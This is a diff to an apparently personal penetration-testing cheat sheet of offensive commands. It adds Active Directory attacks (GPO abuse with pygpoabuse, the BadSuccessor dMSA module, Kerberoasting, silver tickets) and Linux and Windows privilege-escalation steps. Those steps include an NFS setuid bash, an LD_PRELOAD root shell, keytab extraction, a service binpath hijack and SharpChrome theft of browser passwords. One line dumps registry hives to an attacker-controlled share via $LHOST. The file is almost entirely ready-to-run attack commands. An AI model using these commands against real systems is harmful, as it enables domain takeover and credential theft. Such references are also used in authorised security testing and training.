@@ -239,6 +239,11 @@ kerbrute userenum -d <domain> --dc $IP users.txt
 impacket-GetNPUsers <domain>/ -no-pass -usersfile users.txt -dc-ip $IP        # AS-REP roast
 impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip $IP -request               # Kerberoast
 setspn.exe -Q */*                              # native SPN list, from the box, no creds to type
+rusthound-ce -d <dom> -u <user> -p <pass> -i $IP -c All -z   # BloodHound CE collector; beats bloodhound-python
+# GenericWrite/GenericAll on a GPO = SYSTEM on every machine it links (incl. the DC):
+python3 pygpoabuse.py <dom>/<user>:<pass> -gpo-id <GUID> -command 'net localgroup administrators <user> /add' -f
+# Server 2025 DC? BadSuccessor: CreateChild on any OU -> dMSA -> any admin's keys
+nxc ldap $IP -u <user> -p <pass> -M badsuccessor
 #   then: Invoke-Kerberoast -OutputFormat hashcat | fl   or   Rubeus.exe kerberoast /format:hashcat
 # svc account hash -> Administrator on THAT service, no krbtgt/DCSync needed (silver ticket):
 impacket-ticketer -nthash <svc-nt-hash> -domain-sid S-1-5-21-... -domain <dom> -spn MSSQLSvc/sql.<dom>:1433 -user-id 500 Administrator
@@ -335,6 +340,10 @@ showmount -e $IP                               # look for (rw,no_root_squash); c
 sudo mount -t nfs $IP:/export /mnt -o nolock && sudo cp /bin/bash /mnt/rootbash && sudo chmod +s /mnt/rootbash
 #   then on target:  /export/rootbash -p
 id                                             # disk -> debugfs /dev/sda1 (read/write any file) | adm -> /var/log | shadow
+ls -la /run /var/run /tmp | grep '^s'          # world-writable unix socket = shell as whoever listens
+socat - UNIX-CONNECT:/opt/app/live.sock
+ls -la /etc/krb5.keytab /tmp/krb5cc_*          # domain-joined Linux: keytab = AD keys, no cracking
+python3 keytabextract.py /etc/krb5.keytab      # ccache: export KRB5CCNAME then impacket -k -no-pass
 # sudo -l shows env_keep+=LD_PRELOAD -> root with ANY allowed binary, no GTFOBins entry needed
 #   gcc -fPIC -shared -nostartfiles -o /tmp/x.so x.c   (x.c: void _init(){setuid(0);system("/bin/bash");})
 #   sudo LD_PRELOAD=/tmp/x.so <any-allowed-binary>
@@ -349,6 +358,9 @@ x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -static   # i686-w64-mingw32-gcc
 # AppLocker default rules allow all of C:\Windows - these live inside it and are user-writable:
 #   C:\Windows\System32\spool\drivers\color | C:\Windows\Tasks | C:\Windows\Temp   (Get-AppLockerPolicy -Effective -Xml)
 accesschk.exe -uwcqv <user> *                 # services you may reconfigure
+# Backup Operators (SeBackup/SeRestore) reads any file, remotely - DC = machine hash = DCSync:
+impacket-reg <dom>/<user>:<pass>@$IP backup -o '\\'$LHOST'\share'   # then secretsdump -sam/-system LOCAL
+SharpChrome.exe logins /browser:edge           # saved browser passwords, DPAPI-decrypted as that user
 sc config <svc> binpath= "cmd /c net localgroup administrators <user> /add" && sc start <svc>
 #   Server Operators group members can do the above to any service = SYSTEM, no file dropped
 # open Squid proxy (3128/8080)? that is a free tunnel - proxychains conf:  http <ip> 3128
@@ -399,7 +411,7 @@ kubectl auth can-i --list            # create pods -> schedule a privileged host
 hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 # common modes: 0 md5, 1000 ntlm, 1800 sha512crypt, 13100 kerberoast TGS
-# ssh2john / zip2john / rar2john / office2john / keepass2john / pfx2john / gpg2john <file> > hash.txt
+# ssh2john / zip2john / rar2john / office2john / keepass2john / pfx2john / gpg2john / pdf2john <file> > hash.txt
 #   GPG: crack it, gpg --import key, then gpg --decrypt secret.pgp
 # creds hide in file formats, not just hashes - read the artefact before cracking anything
 vncpwd ~/.vnc/passwd                          # VNC: published DES key -> plaintext, no cracking
